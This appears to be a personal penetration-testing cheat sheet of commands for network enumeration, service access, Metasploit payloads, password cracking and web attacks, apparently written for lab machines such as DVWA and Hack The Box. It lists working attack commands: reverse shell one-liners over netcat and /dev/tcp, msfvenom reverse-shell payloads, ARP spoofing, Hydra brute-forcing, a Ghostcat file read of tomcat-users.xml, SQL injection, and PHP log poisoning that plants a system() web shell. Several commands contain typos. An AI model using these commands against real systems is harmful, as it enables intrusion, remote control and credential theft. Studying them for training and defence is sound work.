[Enumeration](#enumeration)
[Services](#services)
[Resources](#resources)
[Exploits](#exploits)
[Remoteshell](#remote-shell)
[Linux](#linux)
[Links](#links)
[SQL](#sql)



# Enumeration
### Netdiscover
    sudo netdiscover
###  Nslookup
    nslookup netdiscover
      
    nslookup
    set q=ms  |  set q=ns
    URL
### Nmap
    nmap [VictimIP] -p- -Pn -sSCV (-oN [file]) (-p [port])
### Enum4linux
    enum4linux -a [VictimIP]
### Gobuster
    gobuster [dir/vhost] -w- /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u [https://nineveh.htb] --apend-domain -t 100 -k

# Services
### Tor&Proxychains
    sudo service tor start
    sudo netstart -tulpn
    sudo nano /etc/proxychains4.conf
    proxychains firefox google.com
    proxychains curl ifconfig.io
### Netcat
    nc [IP] [port]
        GET /HTTP/1.1
        Host: [IP]

    nc -nvlp [port] (> file)
        cat [file] | nc [IP] [port]
### Curl
    curl [IP:port or URL]
### Ftp
    ftp [victim IP]
### Smb
    smbclient -L \\\\[VictimIP]\\
    
    impacket-smbclient [VictimIP]
        shares
        use [dir]
### Nfs
    showmount -e [VictimIP]
    sudo mount -t nfs [VictimIP]:/ /mnt
### Generate hash for users
    openssl passwd [Password]
### .Deb dpkg
    sudo dpkg -i [file].deb
### Nessus
    sudo servise nessusd start
        https://127.0.0.1:8834/#/
### SSH
    sudo su
    cd ~/root/.ssh
    ssh-keygen -t rsa
    cat id_rsa.pub
    echo ssh-rsa [key] >> authorized_keys
    ssh root@[IP] -o HostKeyAlgoritms=+ssh-rsa -o PubKeyAcceptedKeyTypes=+ssh-rsa
### VNC
    cat vnc.log
    cat ~/.vnc/passwd
    cat passwd | base64
    echo [base64code] | base64 -d > passwd
    vncviewer -passwd passwd [VictimIP]
### Mysql
    mysql -h [VictimIP] -u [root] --skip-ssl
        show databases;
        use [tikiwiki];
        show tables;
        select [*, login, password] from [tiki_users];
### SQLmap
    sqlmap --url "[URL]" --data "username=[admin]&password=[admin]" --batch [--dump]
### DVWA
    sudo dvwa-start
        127.0.0.1:42001

# Resources
### searchsploit
    searchsploit [vulnerable]
    cd [path]
    serchsploit -m [exploit.(py)]
    nano [file]
### msfvenom
    msfvenom -p [java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[port] -f war -o rev.war]
    msfvenom -p [windows/shell_reverce_tcp] [LHOST=[IP]] [LPORT=[Port]] [-f python] [-b"\x00\x0a\x09"]
### msfconsole
    msfconsole
    search [search]
    use [num]
        options
        set [option] [value]
        exploit
        set payload [cmd/unix/[reverse]]

# Exploits
### Arp spoofing
    sudo nano /proc/sys/net/ipv4/ip_forward    (0->1)
      sudo arpspoof -t [VictimIP] [RouterIP]
### John
    john --wordlist=/usr/share/wordlists/rockyou.txt file
        (sudo gunzip /usr/share/wordlists/rockyou.txt.gz)
### distccd
    python2 distccd.py -t [VictimIP] -p [port] -c "[code]"
### Ghostcat
    python2 [ghostcat.py] [VictimIP] -f ../../../../etc/tomcat5.5/tomcat-users.xml
### Hydra
    hydra -l [user] -P [/usr/share/wordlists/rockyou.txt] [ftp://[VictimIP]]
    hydra -l [user] -P [/usr/share/wordlists/rockyou.txt] [IP] -s [port] [http-post-form] "/login.php:username=^USER^&^password=^PASS^[other parameters]:[Login failed]"

# Remote shell
### Python r/sh
    python -c 'import pty; pty.spawn("/bin/bash")'
### Netcat r/sh
    nc [IP] [port] -e /bin/bash
### Bash r/sh
    bash -c "bash -i >& /dev/tcp/[IP]/[port] 0>&1"
### Stabilizing r/sh
    which python
    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
        ctrl+z
    stty raw -echo
    fg
    reset

# Linux
### Processes
    ps aux
    [kill] [id]
    jobs
### Read/Whrite/Exec
    chmod [700] [file]
### Compiling C and run
    nano [file.c]
    gcc [file.c] -o [file]
    ./[file]
### Php server
    php -S [IP]:[port]
### Python server
    python -m htt.server [port]

# Links
1. [privilegeEsc](http://gtfobins.github.io/)
2. [secLists](https://github.com/danielmiessler/SecLists)
3. [IppSec](https://ippsec.rocks)
4. [HackTricks](https://book.hacktricks.xyz)

# SQL
    Select [*] from [table];
    Insert into [table] ([column1], [column2]) values ("[value1]", "[value2]");
    Update [table] set [column1]="[value1]" where [column2]=[value2];
    Delete from [table] where [column]=[value]
    union select [*] from [table] -- -
        information_schema.tables

# WEB
### log poisoning
proc/self/envron
proc/self/cmdline

echo > /var/log/dvwa/access.log

curl [http://127.0.0.1:42001] -v -H "User-Agent:<?php system(\$_GET['cmd']) ?>"
    url/[...]&cmd=[ls /]
### LFI
gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list...medium.txt
wpscan --url [URL]
grep -m . -e "1337" -a

# Programms and utils
1. Burp suid
2. foxyproxy(for browser)
3. owasp zap
4. hexeditor
5. coockie quick manager(for browser)